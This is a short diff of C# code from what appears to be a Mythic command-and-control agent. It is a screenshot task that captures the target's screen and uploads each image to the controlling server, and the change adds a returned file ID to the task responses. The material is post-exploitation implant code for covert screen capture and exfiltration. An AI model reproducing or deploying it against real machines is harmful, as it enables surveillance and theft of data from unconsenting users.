@@ -34,7 +34,6 @@ namespace Tasks
                     byte[] bScreen = GetBytesFromScreen(sc);
                     captures.Add(bScreen);
                 }
-
                 foreach(byte[] bScreen in captures)
                 {
                     if (!_agent.GetFileManager().PutFile(
@@ -42,10 +41,15 @@ namespace Tasks
                         _data.ID,
                         bScreen,
                         null,
+                        out string mythicFileId,
                         true))
                     {
-                        resp = CreateTaskResponse("Failed to send screenshot to Mythic", true, "error");
+                        resp = CreateTaskResponse("", true, "error");
                         break;
+                    } else
+                    {
+                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                            mythicFileId, false, ""));
                     }
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(resp);
